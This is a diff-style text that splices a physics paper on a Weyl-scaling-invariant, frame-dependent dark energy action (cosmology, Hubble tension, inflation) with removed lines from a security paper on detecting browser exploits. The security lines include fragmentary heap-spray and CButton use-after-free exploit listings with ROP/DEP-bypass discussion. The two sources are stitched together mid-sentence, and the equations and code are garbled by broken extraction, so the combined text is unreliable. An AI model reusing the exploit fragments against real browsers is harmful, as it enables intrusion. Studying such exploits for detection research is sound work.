+with λ(x) a spacetime scalar function of the coordinate x. When λ(x) = λ, a constant, the
+transformation of Eq. (5) is termed a global Weyl scaling transformation. Since the EinsteinHilbert action of general relativity, which makes a multitude of well-verified predictions, is not
+invariant under Weyl scaling, Weyl’s suggestion was soon abandoned as a possible invariance of
+interest in gravitational physics.
+However, there have been recent revivals. Forger and R¨omer studied properties of gauge field
+currents and the energy-momentum tensor in classical field theories.[13] In the course of this they
+examined the behavior of the classical “improved”spin zero, spin one-half, and spin one fields under
+Weyl scaling of the metric, and corresponding Weyl scalings of the classical fields, of the general
+form
+φ(x) → λ
+pφ (x)φ(x) , (6)
+Here the exponent pφ is characteristic of the field φ(x), with pφ taking the value for each type
+of field that makes its mass zero action Weyl scaling invariant. Drawing on this work, Adler in
+Ref. [1] studied the incorporation of a classical metric into his proposed pre-quantum dynamics,[14]
+leading to a conjecture about the structure of the part of the gravitational action involving no metric
+derivatives, which will be discussed in detail in the next section. Independently, ’t Hooft wrote
+a prominent Gravitational Essay advocating Weyl scaling invariance as “the missing symmetry
+component of space and time”.[15]
 4
-5 f u n c t i o n HeapSp ray ( ) {
-6 . . . SNIP . . . .
-7 }
-8
-9 f u n c t i o n FRemove ( o nL oa dE ve nt ) {
-10 HeapSp ray ( ) ;
-11
-12 s etM a r k e r ( ’ FRemove ’ ) ;
-13 / / FRemove : :
-14 Eleme nt 1 = document . c r e a t e E v e n t O b j e c t ( o nL oa dE ve nt ) ;
-15 document . g et El em e ntB y I d ( ” SpanID ” ) . innerHTML = ” ” ;
-16
-17 s etM a r k e r ( ’ FO v e rw rit e ’ ) ;
-18 / / F O v e r w rit e : : e x e c C r a f t e d + . . . SNIP . . .
-19 / / [ I n f o : 0 x 0c 0 d 0c 0 d + . . . SNIP . . . ]
-20 window . s e t I n t e r v a l ( FO v e rw rit e , 5 0 ) ;
-21 r e s e tM a r k e r ( ) ;
-22
-23 }
-24
-25 f u n c t i o n F O v e r w rit e ( ) {
-26 b u f f e r = ”\ u0c0d\u0c0d . . . SNIP . . . ” ;
-27 f o r ( i = 0 ; i < A r ra y 1 . l e n g t h ; i ++ )
-28 A r ra y 1 [ i ] . d a t a = b u f f e r ;
-29
-30 </ s c r i p t >
-31 . . . SNIP . . .
-32 <s p a n i d =” SpanID”>
-33 <img s r c = ”/ a bc d . g i f ” o nl o a d =”FRemove ( e v e n t ) ” />
-34 </ span>
-35 . . . SNIP . . .
-3) CButton use-after-free (UAF): The third case study
-obtained from the Metasploit4 penetration testing framework
-was chosen for its use of the Return-Oriented Programming
-4The Metasploit Framework - ie cbutton uaf exploit
-(ROP) technique. ROP is about recomposing existing executable content inside the target browser and thus is able
-to bypass Data Execution Prevention (DEP) mitigation that
-renders stack/heap segments non-executable, and any exploits
-expecting them to be so are thus rendered inert. In the
-presence of a library loaded at a deterministic memory address base (i.e. non-Address Space Layout Randomization
-(ASLR) enabled), a UAF exploit (CVE 2012-4792) is used
-to direct execution to an instruction that pivots the stack to
-an attacker-controlled location, enabling the execution of an
-instruction sequence that effectively switches off DEP. The
-exploit then resumes in a similar fashion to the previous
-case study. The sample is shown in Listing 6 and is executed on a Win XP SP3/IE 8.0.6001.18702 environment. The
-entire function mstime_malloc() as called from line 54
-constitutes WM bytecode whose semantics corresponds to
-a sequence of callStackReplace and execCrafted
-primitives. The addresses present in the labels (0x046ae04c
-and 0x046ae1ad) are respectively the contents of the stack
-pointer and program counter registers. These are addresses
-of memory locations allocated during script execution, and
-which trigger the detection of exploit primitives 4 and 3.
-Further iterations would be required to zoom into a finer level
-of analysis granularity in order to identify those statements
-specifically causing each type of exploit primitive behaviour.
-In the meantime the create_btns, free_btns and gc
-markers on lines 19, 27 and 32 respectively remain unlabelled
-due to the same custom allocator issue already encountered
-in the previous case study. On the other hand the prepare
-marker on line 36 is properly labelled. The allocation sizes
-concerned indicate that, in the case of Internet Explorer, larger
-allocations are likely to get detected since they affect the
-underlying system heap manager, or else avoid involving the
-custom allocator altogether.
-Listing 6
-CBU T T O N UAF EXPLOIT
-1 <! d o ct y p e html>
-2 <HTML XMLNS: t =” u r n : schemas − m i c r o s o f t −com : tim e”>
-3 <head>
-4 <meta>
-5 <?IMPORT name s pace =” t ” i m p l e m e n t a t i o n =”# d e f a u l t # tim e 2”>
-6 </meta>
+IV. TRACE DYNAMICS AS MOTIVATION FOR LOCAL WEYL INVARIANCE OF
+THE NONDERIVATIVE GRAVITATION ACTION
+This section is historical, explaining how we were first led to the postulate of a Weyl scaling
+invariant, but frame dependent dark energy action. Readers interested primarily in applications of
+the postulate to cosmology and astrophysics may skip to the next section.
+In Ref. [1] we applied our proposed pre-quantum “trace dynamics” of Ref. [14] to the classical
+gravitational metric. Trace dynamics is the dynamics of matrix-valued fields, using an action
+function formed from the trace of a Lagrangian constructed as a polynomial in these fields. Essential
+use is made of an assumed cyclic invariance of the trace, that is, we assume all fields are “trace
+class”. Varying a trace action automatically gives matrix-valued, or “operator”, equations of
+motion, without proceeding via canonical quantization of a classical action. So trace dynamics
+gives a more general operator dynamics than quantum field theory, with quantum field dynamics
+(as obtained by canonical quantization) a special case, corresponding to field quantities that obey
+the Heisenberg commutation relations.
+The proposal made in Ref. [14] is that quantum field theory is recovered from trace dynamics by
+thermodynamic averaging. That is, quantum field theory is the thermodynamics of an underlying
+trace dynamics, obtained by averaging over a canonical ensemble constructed as2
+ρ ∝ e
+−βH = e
+−β
+R
+d
+3x(
+(4)g)
+1/2T rT0
+0
+(t,~x)
+, (7)
+with H the trace Hamiltonian, and T
+0
+0
+the mixed index zero-zero component of the energy momentum tensor. Applying the analysis of Forger and R¨omer, one sees that H, as well as the trace
+Lagrangian L, is globally Weyl scaling invariant for the case of massless underlying fields. Let us
+now define the induced gravitational action as
+S[g]induced ∝
+Z
+d
+4x(
+(4)g)
+1/2LAV , (8)
+where the subscript AV denotes averaging over the canonical ensemble of Eq. (7). Then since all
+quantities used to form Eq. (8) are globally Weyl scaling invariant, the induced gravitational action
+inherits this invariance property as well. Also, since all quantities appearing in Eq. (8) are invariant
+under three-space general coordinate transformations, the induced gravitational action must have
+this invariance also. Moreover, if we restrict ourselves to the part of the induced action that is
+2 Additional terms in the exponent in ρ not shown in Eq.(7) have the same scale invariance properties as H; see
+Ref. [1] for details.
+5
+independent of derivatives of the metric, global Weyl invariance implies local Weyl invariance, and
+corresponds, for diagonal metrics with g0i = g
+0i = 0, to the unique functional form
+S[g]induced = K
+Z
+d
+4x(
+(4)g)
+1/2
+(g00)
+−2
+, (9)
+with K a constant. Many more details of the argument just sketched are given in Ref. [1].
+In addition to Weyl scaling invariance, and three-space general coordinate invariance, the induced action of Eq. (9) inherits one other key property from the construction of Eq. (8). Since the
+trace Hamiltonian is the time component of a four-vector, the canonical ensemble of Eq. (7) picks
+out a preferred frame, and so therefore does the induced gravitational action. Thus, the action of
+Eq. (9) has the unusual property that it is not four-space general coordinate invariant. We shall
+assume, on grounds of simplicity, that its preferred frame is the rest frame of the Cosmological Microwave Background (CMB) radiation. Specifically, the action of Eq. (9) has rotational symmetry,
+as does the CMB in its rest frame when small fluctuations are averaged, so we are assuming that
+there is only one inertial frame with this property, which is both the rest frame of the CMB and
+the frame to which the metric component g00 in Eq. (9) is referred.
+V. KEY POSTULATE
+Motivated by these arguments, we now introduce our key postulate, that the part of the gravitational action that is independent of metric derivatives is global Weyl scaling invariant, three-space
+general coordinate invariant, but frame dependent. The Einstein-Hilbert action, on the other hand,
+which involves metric derivatives, is assumed to have its usual non-Weyl-scaling invariant form.
+The Weyl scaling invariance condition for the non-derivative part of the gravitational action rules
+out a dark energy action of the traditional form of Eq. (1), that is, it requires that the underlying
+dynamics leads to a sum rule giving exact cancellation of bosonic and fermionic vacuum energies.
+Instead, identifying the constant K in Eq. (9) with the usual numerical factors times the observed
+cosmological constant, we propose that the dark energy action has the form
+Seff = −
+Λ
+8πG Z
+d
+4x(
+(4)g)
+1/2
+(g00)
+−2
+. (10)
+To set up a phenomenology to distinguish between Scosm and Seff,[4] we form an action SΛ that is
+a linear combination of the two,
+SΛ = (1 − f)Scosm + fSeff = −
+Λ
+8πG Z
+d
+4x(
+(4)g)
+1/2
+[1 − f + f(g00)
+−2
+] , (11)
+6
+so that for f = 0 one has only Scosm, for f = 1 one only has Seff, and for g00 ≡ 1 the parameter
+f drops out of Eq. (11). Thus, SΛ depends on f only through the deviation of g00 from unity
+arising from metric perturbations. Setting up the calculation this way permits a convenient check
+that metric perturbation formulas reduce to the standard ones when f = 0. In Sec. VII will only
+quote final results specialized to f = 1.3 For f = 1 one cannot eliminate frame-dependent effects
+by redefining the time variable, since as shown in Sec. IIA of Ref. [5], and is explicitly seen in
+Eqs. (36)–(38) below, one is prevented from doing so by the fact that Eq. (11) is only three-space,
+and not four-space general coordinate invariant. Hence observable new physics effects can arise for
+f = 1.
+VI. OBJECTIONS AND WORRIES
+Years ago, when attending a Stanford Linear Accelerator Center program committee meeting,
+we heard one of the participants make the memorable statement: “Every good experiment needs
+a first class worrier”. In other words, if one doesn’t worry about everything that might have
+gone wrong, you are apt to fool yourself and get spurious results. The same holds true for novel
+theoretical proposals. In this section we go over various objections to, and worries about, the
+proposed dark energy action of Eq. (10).
+1. Q Doesn’t Eq. (10) conflict with the relativity principle? A According to special relativity,
+the laws of physics take the same form in all “inertial” frames moving uniformly with respect
+to one another. This used to be interpreted as a statement that one cannot specify a
+distinguished inertial frame. However, observation of the dipole component of the CMB
+does allow one to determine one’s relative velocity with respect to the CMB rest frame,
+so there now is a way to specify the absolute velocity of an inertial frame: just build a
+radiometer and make an all sky map of the CMB. Given that a preferred frame exists, this
+opens the possibility that low level physical effects may be linked to that frame. As already
+noted, since the CMB is isotropic in its rest frame (apart from very small fluctuations), it is
+natural to identify the preferred frame of Eq. (10), which has spherical symmetry, with the
+CMB rest frame.
+3
+In Sec. 4 of Ref. [6], we made interpretive statements about 0 < f < 1, which we now think should be ignored.
+For f = 0, metric perturbations that depend only on t can be absorbed into the definitions of the proper time τ
+and the expansion parameter a(τ ), so nothing new happens. For an action with g
+−2
+00 replaced by g
+−p
+00 , working to
+first order in metric perturbations f enters through the product f p.
 7
-8 <s c r i p t >
-9 f u n c t i o n m stim e m all o c ( oArg ) {
-10 . . . SNIP . . .
-11 }
+2. Q Isn’t Eq. (10) ruled out by the accurate verification of the standard model of cosmology?
+A The standard homogeneous, isotropic Friedmann-Lemaˆıtre-Robertson-Walker (FLRW)
+line element has the form (ds)
+2 = (dt)
+2 − a
+2
+(t)
+
+(dr)
+2 + r
+2dΩ
+2
+
+, with a(t) the expansion
+factor. Thus since g00 = 1 for this line element, the dark energy actions of Eqs. (1) and (10)
+are indistinguishable in FLRW cosmology. Changes due to f 6= 0 become apparent only at
+first order in perturbations from uniformity, and will be discussed in Sec. VII.
+3. Q The standard derivation of a conserved energy-momentum tensor,[16] that is used to
+form Einstein equations which are consistent with the Bianchi identities, relies on four-space
+general coordinate invariance. So how can one get consistent Einstein equations with the dark
+energy action of Eq. (10)? A One adopts a 3+1 point of view,[1] as is done in formulating the
+initial value problem in general relativity.[17] Varying the total action, obtained by adding
+Eq. (10) to the Einstein-Hilbert action, with respect to the spatial components gij of the
+metric, gives the spatial components of the Einstein equations, including spatial components
+of the energy-momentum tensor T
+ij . The remaining components T
+00 and T
+0i = T
+i0 are then
+fixed by imposing covariant conservation on T
+µν, or equivalently, by using Bianchi identities
+for the Einstein tensor Gµν . For spherical and axial black holes we find that constructing a
+“covariant completion” of T
+ij in this manner requires only solving algebraic equations,[2],[7]
+while for cosmological metrics only an ordinary differential equation with respect to the time
+variable needs to be solved.[4],[5]
+4. Q Doesn’t Eq. (10) permit scalar gravitational waves, which are ruled out observationally?
+The usual proof that there are no scalar gravitational waves makes use of four-space general
+coordinate invariance. A It turns out that just the three-space general coordinate invariance
+of Eq. (10) is enough to eliminate scalar propagating waves, but to see this it is necessary to
+calculate the f 6= 0 corrections to the theory of first order perturbations around the FLRW
+metric. This was done in Ref. [4], where we calculate the changes in the scalar equations
+obeyed by the perturbation amplitudes A, B, E, and F, in the notation of Weinberg,[18]
+and where we show that the amplitude B can be eliminated by using three-space general
+coordinate invariance.4 Dropping matter source terms, we set up the homogeneous equations
+for scalar waves, assuming that the expansion factor a and the ratios ˙a/a ≡ H and ¨a/a ≡
+4 The gauge choice B = 0 could be termed “semi-Newtonian” gauge; choosing either full Newtonian gauge (B =
+F = 0) or synchronous gauge (E = F = 0) would require making a time-dependent gauge transformation, which
+is not an invariance of Eq. (10)
+8
+H2Q are slowly varying. Making a Fourier Ansatz for a possible scalar wave with spatial
+dependence5
+e
+ia~k·~x and time dependence e
+−iωt, we solve for the F and A amplitudes in terms
+of the amplitude E to get the two equations
+0 =E[(~k)
+2α(ω) + β(ω)] ,
+0 =E[(~k)
+2α(ω) + δ(ω)] ,
+(12)
+with coefficients
+α(ω) =(iΛfH/ω3
+)/(1 + iH/ω) ,
+β(ω) =(Q − 1)H
+2 + 3iΛfH/ω ,
+δ(ω) = − 3β(ω) .
+(13)
+Since the two equations for E are inconsistent, we must have E = 0 and hence no propagating
+scalar waves. We note in passing that the perturbation equations in B = 0 gauge can also
+be usefully written in terms of F and the two “gauge invariant” perturbation amplitudes Φ
+and Ψ, which we have done in Appendix A of Ref. [5]. From this, one sees that even with
+f 6= 0, the Einstein equations imply the usual perturbative relation Ψ = Φ.
+5. Q Astronomical black holes are observed with masses ranging from around 4 up to 108
+solar masses. Is Eq. (10), with the unusual factor g
+−2
+00 , which would become infinite at a
+horizon where g00 = 0, consistent with this? A In Ref. [2] the Schwarzschild-like spherically
+symmetric solution, arising from the Einstein–Hilbert action with the addition of the action
+of Eq. (10), was calculated in a perturbation expansion. In terms of polar coordinates with
+the line element
+(ds)
+2 =B(r)(dt)
+2 − A(r)(dr)
+2 − r
+2
+dΩ
+2
+,
+dΩ
+2 =(dθ)
+2 + sin2
+(θ)(dφ)
+2
+,
+(14)
+5 By choosing the spatial dependence of the scalar wave to include a factor of a in front of the wave number ~k, the
+slowly varying quantity a factors out of the equations for the Fourier coefficients.
+9
+we find that near the nominal horizon at r = 2M the leading corrections to A and B are
+A =(1 − 2M/r)
+−1
+
+1 + Λ 48M4
+(r − 2M)
+2
++ O(Λ2
+)
+
+,
+B =(1 − 2M/r)
+
+1 − Λ
+16M4
+(r − 2M)
+2
++ O(Λ2
+)
+
+.
+(15)
+The correction terms become significant only for when the distance |r−2M| from the nominal
+horizon is of order
+|r − 2M| ∼ Λ
+1/2M2 = Λ1/2M2
+⊙(M/M⊙)
+2 ≃ 2 × 10−18cm(M/M⊙)
+2
+, (16)
+with M⊙ the solar mass. So except very near the nominal horizon, the metric is very close
+to the standard Schwarzschild black hole metric. In Ref. [2], the corresponding perturbation
+expansion was also calculated in isotropic coordinates, with a similar conclusion. We will
+have more to say about implications for black hole structure in Sec. VIII below.
+VII. IMPLICATIONS FOR COSMOLOGY
+In the papers Refs. [5],[6] we used the first order perturbation analysis of Ref. [4] to discuss
+implications of Eq. (11) for late time cosmology. In Ref. [5] the analysis was done using coordinate
+time t , and the results were then reexpressed in terms of proper time τ by a rescaling of the initially
+assumed Hubble parameter. In Ref. [6], all results were expressed from the outset in terms of proper
+time and the Hubble parameter HPl
+0 ≃ 67.27kms−1Mpc−1 measured by Planck,[19] and we follow
+this presentation here, giving results specialized to f = 1, corresponding to Eq. (10) being the sole
+dark energy action.
+In terms of the proper time τ , the line element for our model takes the form6
+(ds)
+2 = (dτ )
+2 − ψ
+2
+[τ ](d~x)
+2
+, (17)
+6 We follow the convention of using [τ ] to denote functional dependence on the proper time τ , and (t) to denote
+functional dependence on the coordinate time t, where t is a function t[τ ] of τ , and conversely, τ is a function τ (t)
+of t. Thus, for any time-dependent quantity F, F(t) = F(t[τ ]) = F[τ ] = F[τ (t)] = F(t), with F[ ] and F( ) in
+general being different functions of the argument, unless τ ≡ t.
+10
+with ψ[τ ] given in the matter-dominated era by the following formulas,
+Φ( ˆ x) ≡Φ(x)/Φ(0) ,
+∆(x) ≡Φ(x) − Φ(0) = Φ(0)[Φ( ˆ x) − 1] ,
+ψ[τ ] =a[τ ] [1 − ∆(x)] ,
+a[τ ] = 
+Ωm
+ΩΛ
+1/3
+
+sinh(ˆx[τ ])2/3
+,
+xˆ[τ ] =x −
+Z x
+0
+du∆(u) ,
+x =
+3
+2
+√
+ΩΛH
+Pl
+0
+τ .
+(18)
+Here Ωm ≃ 0.321 and ΩΛ ≃ 0.679 are the cosmological matter and dark energy fractions, for
+which we have used the Planck 2018 values.[19] The initial value of the metric perturbation Φ at
+τ = 0, denoted by Φ(0), is the sole parameter of the model, and is treated as a small quantity to
+first order. Thus our model extends the six parameter ΛCDM model to a seven parameter model,
+with Φ(0) as the seventh parameter. When Φ(0) = 0, and also in the small x limit, the above
+equations reduce to the standard equations of FLRW cosmology.
+The function Φ( ˆ x) gives the time evolution of the metric perturbation, normalized to unity at
+τ = 0, and is given exactly in terms of a hypergeometric function by the following formula,[6]
+Φ( ˆ x) =(1 − u)
+b
+2F1(a, b, c; u) ,
+a =
+1
+2
++ b ,
+b =
+1
+3
+[2 + √
+7] ,
+c =
+11
+6
+,
+u =tanh2
+(x) .
+(19)
+When Eq. (19) is expanded in powers of x, the first three terms, which suffice at present for
+comparisons with experiment, are
+Φ( ˆ x) = 1 + Cxˆ 2 + Dxˆ 4 + O(x
+6
+) , (20)
+11
+with
+Cˆ =
+2
+11
+= 0.1818 ,
+Dˆ = −
+2
+561
+= −0.00357 .
+(21)
+Using these formulas, various quantities of astrophysical interest can be calculated, as follows.
+1. Effective redshift In terms of a[τ ], the redshift zeff in our model, for light emitted at proper
+time τ and observed at the present proper time τ0, is given by
+1 + zeff =
+ψ[τ0]
+ψ[τ ]
+=
+1
+ψ[τ ]
+=
+1
+a[τ ][1 − ∆(x)] . (22)
+2. Hubble parameter Corresponding to the line element of Eq. (17), the Hubble parameter
+Heff[τ ] is given by
+Heff[τ ] =dψ[τ ]/dτ
+ψ[τ ]
+=
+dψ[τ ]/dx
+ψ[τ ]
+dx/dτ
+=
+
+da[τ ]/dxˆ[τ ]
+a[τ ]
+dxˆ[τ ]/dx −
+d∆(x)
+dx 
+3
+2
+√
+ΩΛH
+Pl
+0
+=HPl
+0
+√
+ΩΛcoth(ˆx[τ ]) 
+1 − ∆(x) −
+3
+2
+tanh(x)
+d∆(x)
+dx 
+.
+(23)
+Dividing by HPl
+0
+, squaring, and using coth2
+(ˆx[τ ]) = 1 + 1/ sinh2
+(ˆx[τ ]), and then using Eqs.
+(18) and (22) to eliminate sinh2
+(ˆx[τ ]) in terms of the cube of (1 + zeff)[1 − ∆(x)], we get the
+result
+
+Heff[τ ]
+HPl
+0
+2
+=Ω˜ m(1 + zeff)
+3 + Ω˜
+Λ ,
+Ω˜m
+Ωm
+=1 − 5∆(x) − 3 tanh(x)
+d∆(x)
+dx ,
+Ω˜
+Λ
+ΩΛ
+=1 − 2∆(x) − 3 tanh(x)
+d∆(x)
+dx ,
+(24)
+with Ω˜ m and Ω˜
+Λ redshift-dependent effective matter and dark energy densities. To calculate
 12
+x in the above formulas from zeff, it suffices to use the zeroth order formulas
+x =arcsinh(s) = log(s + (s
+2 + 1)1/2
+) ,
+s =
+
+ΩΛ
+Ωm
+1/2
+1
+(1 + zeff)
+3/2
+.
+(25)
+An interpretation of Eq. (24) as a modified dark energy equation of state,
+wΛ(z) = − 1 +
+1
+3
+(1 + z)
+d
+dz log U(z) ,
+U(z) = 1
+ΩΛ
+"
+Ω˜ m(1 + z)
+3 + Ω˜
+Λ
+
+|z
+
+Ω˜ m(1 + z)
+3 + Ω˜
+Λ
+
+|0
+− Ωm(1 + z)
+3
+#
+,
+(26)
+is given in Appendix B of Ref. [6].
+3. Present proper time τ0 The present proper time τ0 is determined by the condition ψ[τ0] =
+1. Equivalently, we have to calculate xτ0 = (3/2)√
+ΩΛHPl
+0
+τ0, and to do this we proceed as
+follows. We begin by writing ˆx[τ0] ≡ x0 + ∆ˆx, where x0 = arcsinh
+(ΩΛ/Ωm)
+1/2
+
+≃ 1.169, so
+that the first order perturbation ∆ˆx is fixed by
+[1 + ∆(x0)]ψ[τ0] =1 + ∆(x0) = a[τ0]
+=
+
+Ωm
+ΩΛ
+1/3
+(sinh(ˆx[τ0]))2/3
+=
+
+Ωm
+ΩΛ
+1/3
+(sinh(x0 + ∆ˆx))2/3
+=1 + (2/3) coth(x0)∆ˆx ,
+(27)
+which using coth(x0) = 1/
+√
+ΩΛ gives
+∆ˆx = (3/2)√
+ΩΛ∆(x0) . (28)
+We then invert the relation between x and ˆx[τ ] to give
+xτ0 =ˆx[τ0] + Z x0
+0
+du∆(u)
+=x0 + (3/2)√
+ΩΛ∆(x0) + Z x0
+0
+du∆(u) .
+(
 13
-14 f u n c t i o n h ell oW o rl d ( ) {
-15 e f o rm = document . g et El em e ntB y I d ( ” fo rmelm ” ) ;
-16 e di v = document . g et El em e ntB y I d ( ” di v elm ” ) ;
+Multiplying through by 2/(3√
+ΩΛHPl
+0
+), this is equivalent to
+τ0 = τ
+Pl
+0 +
+1
+HPl
+0
+
+∆(x0) + 2
+3
+√
+ΩΛ
+Z x0
+0
+du∆(u)
+
+(30)
+with τ
+Pl
+0 = 2x0/(3√
+ΩΛHPl
+0
+) = 13.83Gyr.
+4. Present Hubble parameter Turning now to the calculation of Heff(present)/HPl
+0
+, from
+Eq. (23) we get
+Heff(present)/HPl
+0 =
+√
+ΩΛcoth(x0 + ∆ˆx) [1 − ∆(x0) − (3/2)√
+ΩΛd∆(x0)/dx0] . (31)
+From the expansion
+coth(x0 + ∆ˆx) = 1
+√
+ΩΛ
+[1 + (3/2)(ΩΛ − 1)∆(x0)] = 1
+√
+ΩΛ
+[1 − (3/2)Ωm∆(x0)] , (32)
+we get
+Heff(present)
+HPl
+0
+= 1 −
+3
+2
+Ωm + 1
+∆(x0) + 3
+2
+√
+ΩΛ
+d∆(x0)
+dx0
+
+. (33)
+Putting in numerical values Ωm = 0.321, ΩΛ = 0.679 and x0 ≃ 1.169, together with the
+f = 1 values Φ( ˆ x0) − 1 = 0.244 and dΦ( ˆ x0)/dx0 = 0.409, we get
+Heff(present)
+HPl
+0
+≃ 1 − 0.867 Φ(0) . (34)
+The recently much discussed “Hubble tension”,[20],[21] is a mismatch between the value of
+the Hubble parameter Heff(present) measured from supernova counts in the recent epoch,
+and the value HPl
+0
+inferred from the Planck analysis of CMB fluctuations, which record the
+state of the universe at the very early time of matter-radiation decoupling. The supernova
+value is found to be about ten percent larger than the Planck value, suggesting that the
+accelerating expansion of the universe may have speeded up. From Eq. (34), we see that to
+fit a tension of Heff (present)
+HPl
+0
+≃ 1.1 with the scale invariant action of Eq. (10) we would need
+to choose Φ(0) ≃ −0.115 (corresponding to 1 + Φ(0) ≃ 0.885 ≃ 0.9 as used in Fig. 1). For
+this value of Φ(0), the correction factors Ω˜ m/Ωm and Ω˜
+Λ/ΩΛ in Eq. (24) are greater than
+unity by roughly 20 to 30 percent. Thus it will be important to include these in analyses
+assessing the viability of our model.
+5. Remarks on possible origins of the Hubble tension If the Hubble tension should turn
+out to be an artifact arising from mis-calibration of the distance ladder, as suggested in
+Ref. [22], or if the Hubble tension is real but arises exclusively from early time physics, as
+14
+advocated in Ref. [23], then our analysis is consistent with Φ(0) = 0. In this case the dark
+energy action of Eq. (10) would be indistinguishable from the standard action of Eq. (1),
+via cosmological measurements, through first order in perturbations. If the reported Hubble
+tension survives further testing, and has a late time component, then ∆(x0) = Φ(0)[Φ( ˆ x0)−1]
+must be negative. Approximating ∆(x0) by the quadratic term Φ(0) 2
+11x
+2
+0
+in the expansion
+of Φ( ˆ x0) − 1, a negative value of ∆(x0) corresponds to Φ(0) negative, which could be argued
+to be plausible since Φ is an analog of the Newtonian gravitational potential.[24],[25]
+6. Scenario for inflation arising from a frame-dependent dark energy action So far we
+have considered Φ as a small perturbation around the FLRW metric. The generic case when
+Φ is not small was also considered in Ref. [5]. The general line element in a homogeneous,
+isotropic, zero spatial curvature universe, in which physics is invariant in form only under
+three-space general coordinate transformations, is given by
+(ds)
+2 = α
+2
+(t)(dt)
+2 − ψ
+2
+(t)(d~x)
+2
+. (35)
+Taking Eq. (10) for the dark energy action (i.e., setting f = 1 in Eq. (11)), and assuming
+that the particulate matter energy-momentum tensor has a relativistic perfect fluid form with
+pressure p and energy density ρ, the ij component of the Einstein equations and covariant
+conservation of the matter stress-energy tensor give respectively the two equations,[5]
+2ψ(t)[α(t)ψ¨(t) − α˙(t)ψ˙(t)] + α(t)ψ˙2
+(t)
+α3
+(t)
+=ψ
+2
+(t)
+
+Λ
+α4
+(t)
+− 8πGp(t)
+
+,
+d
+
+ρ(t)ψ
+3
+(t)
+
+dt = − 3p(t)ψ˙(t)ψ
+2
+(t) ,
+(36)
+with the dot denoting a time derivative d/dt. The corresponding 00 component of the
+Einstein equations is shown in Ref. [5] to be be a consequence of the two equations in Eq.
+(36), and so does not give additional information. When α = 1 + Φ with Φ small, and a
+corresponding perturbative assumption is made for ψ, Eqs. (36) were shown in Ref. [5] to
+reproduce the perturbative analysis discussed previously.
+But let us now study the case where α is not assumed to be near unity. As a first step, let
+us rewrite Eqs. (35) in terms of the proper time τ defined by
+dτ = α(t)dt , (37
+15
+giving after some algebra
+2ψ[τ ]ψ
+′′[τ ] + (ψ
+′
+[τ ])2
+ψ2
+[τ ]
+=
+Λ
+α4
+[τ ]
+− 8πGp[τ ] ,
+(ρ[τ ]ψ
+3
+[τ ])′ = − 3p[τ ]ψ
+′
+[τ ]ψ
+2
+[τ ] ,
+(38)
+with the prime denoting a proper time derivative d/dτ . The fact that the transformation to
+proper time does not eliminate the function α[τ ] from these equations is a direct reflection
+of the fact that the dark energy term in the action from which these equations are derived
+is not four-space general coordinate invariant. Consider now what would happen if at some
+very early time τ the function α[τ ], instead of being close to unity, is very small and nearly
+constant, say α[τ ] ≃ α¯. Neglecting the matter pressure term 8πGp[τ ], the ψ[τ ] equation in
+Eq. (38) is then approximated by
+2ψ[τ ]ψ
+′′[τ ] + (ψ
+′
+[τ ])2
+ψ2[τ ]
+=
+Λ
+α¯
+4
+, (39)
+which (choosing the positive square root of H2
+) is solved by
+ψ[τ ] = e
+Hτ , H2 =
+Λ
+3¯α4
+. (40)
+This would correspond to a very early “inflationary” period for τ < 0, with inflation ending
+as α[τ ] increases to a value close to and (as suggested by the Hubble tension analysis) slightly
+below unity at τ = 0, which we have taken as the beginning of conventional “Big Bang”
+cosmology. Our perturbative analysis then shows that α[τ ] = 1 + Φ(0)Φ( ˆ x) decreases again
+for τ > 0, and is approximated by a downwards parabola centered on x = 0, since Φ( ˆ x)
+is an increasing function of x. A τ < 0 nonperturbative increase in α, needed to end the
+early inflation, would have to occur by a mechanism for which we do not have equations, but
+which presumably arises from the pre-quantum theory that gives rise to the scale invariant
+action of Eq. (10). A sketch of this suggested behavior is given in Fig. 1. Note that if
+Φ(0) were ≥ 0, the downwards parabola of Fig. 1 would be replaced by a straight line
+
+Φ(0) = 0
+or an upwards parabola
+Φ(0) > 0
+
+, and a smooth match of the α[τ ] curve to
+an inflationary era would not be possible. Thus, in this interpretation, the current Hubble
+tension, corresponding to Φ(0) < 0, is a remnant in the “Big Bang” epoch of the inflationary
+era when α[τ ] << 1.
+In the usual picture of inflation, the role of the term Λ/α[τ ]
+4
+in the above discussion is played
+by a very large potential energy V
+
+φ(τ )
+
+of a scalar “inflaton” field φ[τ ], with the potent
+16
+FIG. 1: Sketch of the suggested behavior of α[τ] versus the rescaled proper time x = 3
+2
+√
+ΩΛHPl
+0
+τ.
+constructed to be very flat near the maximum, with φ slowly rolling down the potential hill
+so that V ends up, in the “Big Bang” epoch, being comparable in magnitude to the pressure
+term 8πGp. This model for inflation has a huge literature and is well described in standard
+texts.[26],[27] Whether an inflaton and its potential are actually present in the universe, or
+whether they are useful proxies for a new type of gravitational dynamics as suggested here,
+is presently not known.7 8
+7 Our interpretation suggests an intriguing calculation. Writing Λ = 3H
+2
+0ΩΛ using Planck values, and taking the
+square root, we get HPl
+0 = (Λ/3)1/2
+/
+√
+ΩΛ, with √
+ΩΛ ≃ 0.824. Extrapolating Eq. (40) by defining a τ dependent
+H[τ ] expressed in terms of α[τ ] by H[τ ] = (Λ/3)1/2
+/α2
+[τ ], and using the value α[0] ≃ 0.885 obtained from fitting
+the Hubble tension, we get α
+2
+[0] ≃ 0.783, which differs by about five percent from √
+ΩΛ. So the extrapolated H[0] is
+close to the Planck value of the Hubble constant. This curious observation can be rephrased in a different way: if we
+impose that the extrapolated H[0] should be equal to H
+Pl
+0 , we deduce the relation 0.885 ≃ α[0] ≃ (ΩΛ)
+1/4 ≃ 0.907,
+which is good to a few percent. Significant, or numerology?
+8 Dabholkar has proposed imposing Weyl scaling invariance on the total gravitational action, including the EinsteinHilbert action, by including an additional “compensator field” Ω which he suggests could play the role of the
+inflaton.[28] This proposal differs from ours, in which the Einstein-Hilbert action retains its original, Weyl scaling
+breaking form.
 17
-18 s etM a r k e r ( ’ c r e a t e b t n s ’ ) ;
-19 / / c r e a t e b t n s : :
-20 f o r ( i = 0; i < 2 0; i ++ ) {
-21 document . c r e a t e E l e m e n t ( ’ b utt o n ’ ) ;
-22 }
-23 e di v . a p p e n dC hil d ( document . c r e a t e E l e m e n t ( ’ b utt o n ’ ) ) ;
-24 e di v . f i r s t C h i l d . a p pl y El em e nt ( e f o rm ) ;
-25
-26 s etM a r k e r ( ’ f r e e b t n s ’ ) ;
-27 / / f r e e b t n s : :
-28 e di v . innerHTML = ” ” ;
-29 e di v . a p p e n dC hil d ( document . c r e a t e E l e m e n t ( ’ body ’ ) ) ;
-30
-31 s etM a r k e r ( ’ gc ’ ) ;
-32 / / gc : :
